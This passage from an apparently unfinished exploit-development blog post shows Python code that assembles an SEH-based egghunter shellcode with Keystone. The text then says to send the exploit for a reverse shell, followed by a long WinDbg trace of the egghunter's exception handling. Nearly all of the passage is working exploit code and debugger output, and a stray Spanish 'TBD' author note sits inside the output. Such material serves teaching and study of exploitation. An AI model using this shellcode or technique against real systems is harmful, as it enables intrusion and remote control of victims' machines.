</span></span><span style="display:flex;"><span> <span style="color:#75715e"># and repeat&#34; jnz loop_inc_one ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># we found our signature and will jump to it  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; jmp edi ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_page: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># if page is invalid the exception_handler will  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># update eip to point here and we move to next page&#34; or bx, 0xfff ;&#34;  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_one: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase ebx by one byte  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; inc ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># check for signature again  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; jmp is_egg ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; get_seh_address: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># call to a higher address to avoid null bytes &amp; push  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># return to obtain egghunter position&#34; call build_exception_record ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push 0x0c onto the stack  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x0c ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the value into ecx  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov into eax the pointer to the CONTEXT  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># structure for our exception&#34; mov eax, [esp+ecx] ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov 0xb8 into ecx which will act as an  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># offset to the eip&#34; mov cl, 0xb8 ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase the value of eip by 0x06 in our CONTEXT  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># so it points to the &#34;or bx, 0xfff&#34; instruction # to increase the memory page&#34; add dword ptr ds:[eax+ecx], 0x06 ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># save return value into eax  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase esp to clean the stack for our call  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add esp, 0x10 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push return value back into the stack  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># null out eax to simulate  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># ExceptionContinueExecution return&#34; xor eax, eax ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># return  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; ret ;&#34;</span>  
</span></span><span style="display:flex;"><span>)  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize engine in 32bit mode  </span>
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_X86, KS_MODE_32)  
</span></span><span style="display:flex;"><span>encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(CODE)  
</span></span><span style="display:flex;"><span>egghunter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> dec <span style="color:#f92672">in</span> encoding:  
</span></span><span style="display:flex;"><span> egghunter <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x</span><span style="color:#e6db74">{0:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(int(dec))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;egghunter = (</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> egghunter <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>)
</span></span></code></pre></div><p>After checking no null bytes, append the egghunter instead of the classical egghunter and send the exploit. You should get a reverse shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span><span style="color:#ae81ff">99000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">022</span>dff60
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">022e0000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">022</span>dc000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span><span style="color:#ae81ff">99000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">000012e0</span> . <span style="color:#ae81ff">00001</span><span style="color:#ae81ff">904</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">0038f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// NO CUSTOM HANDLERS. EXCEPTION GOING TO BE HANDLED WITH DEFAULT HANDLER.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">022</span>dff60
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x022dffcc</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77ae8b10</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>_except_handler4<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">12e0.1</span>d20)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">74303077</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000004</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000002</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>ae2da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b5868 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000004</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eab3 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010202</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eab3 f3af            repe scas dword ptr es:[edi]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span><span style="color:#ae81ff">94000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ea1c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac2
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>c000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span><span style="color:#ae81ff">94000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">000012e0</span> . <span style="color:#ae81ff">00001</span>d20
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0064</span>a0e0
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">0038f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ea1c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0xffffffff</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x04f1eac6</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">4f</span><span style="color:#ae81ff">1</span>eac6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> BP <span style="color:#ae81ff">0x04f1eac6</span>     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac6 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>af6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac6 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>c0 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>e0 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac6 <span style="color:#ae81ff">6</span>a0c            push    <span style="color:#ae81ff">0</span>Ch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> u eip L10
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac6 <span style="color:#ae81ff">6</span>a0c            push    <span style="color:#ae81ff">0</span>Ch
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac8 <span style="color:#ae81ff">59</span>              pop     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac9 <span style="color:#ae81ff">8</span>b040c          mov     eax,dword ptr [esp<span style="color:#f92672">+</span>ecx]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eacc b1b8            mov     cl,<span style="color:#ae81ff">0</span>B8h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eace <span style="color:#ae81ff">83040806</span>        add     dword ptr [eax<span style="color:#f92672">+</span>ecx],<span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead2 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead3 <span style="color:#ae81ff">83</span>c410          add     esp,<span style="color:#ae81ff">10</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead6 <span style="color:#ae81ff">50</span>              push    eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead7 <span style="color:#ae81ff">31</span>c0            xor     eax,eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead9 c3              ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> bp <span style="color:#ae81ff">0x04f1ead9</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">2</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">000000</span>b8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>af6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead9 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>d0 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>e0 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead9 c3              ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">04f1e4</span>d0 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>d0 <span style="color:#ae81ff">52</span>              push    edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>d1 <span style="color:#ae81ff">62</span>af771ceaf1    bound   ebp,qword ptr [edi<span style="color:#f92672">-</span><span style="color:#ae81ff">0E15</span>E389h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>d7 <span style="color:#ae81ff">0470</span>            add     al,<span style="color:#ae81ff">70</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>d9 <span style="color:#ae81ff">62</span>af771ceaf1    bound   ebp,qword ptr [edi<span style="color:#f92672">-</span><span style="color:#ae81ff">0E15</span>E389h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>df <span style="color:#ae81ff">04</span>a8            add     al,<span style="color:#ae81ff">0</span>A8h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>e1 e5f1            in      eax,<span style="color:#ae81ff">0F</span><span style="color:#ae81ff">1</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>e3 <span style="color:#ae81ff">0424</span>            add     al,<span style="color:#ae81ff">24</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>e5 <span style="color:#ae81ff">62</span>af77c0e5f1    bound   ebp,qword ptr [edi<span style="color:#f92672">-</span><span style="color:#ae81ff">0E1</span>A3F89h]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">000000</span>b8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>af6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>af6252 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>d4 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>e0 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>af6252 <span style="color:#ae81ff">648</span>b2500000000  mov     esp,dword ptr fs:[<span style="color:#ae81ff">0</span>] fs:<span style="color:#ae81ff">003</span>b:<span style="color:#ae81ff">00000000</span><span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>d4
</span></span><span style="display:flex;"><span>TBD DECIR QUE DESPUES DEL RET NO HEMOS IDO A <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead9 SINO A ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span> y que esto acaba volviendo a buscar en nuestra memoria o si encuentra el code nos da la shell
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">12e0.1</span>d20)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">74303077</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00001000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000002</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>ae2da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b5868 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00001000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eab3 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010216</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eab3 f3af            repe scas dword ptr es:[edi]
</span></span></code></pre></div></div>
</article>






                    </main><footer>
    <hr />

<p><small>
        2025 &copy; made by jaco with love
    </small></p>
    <p><small>
        Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
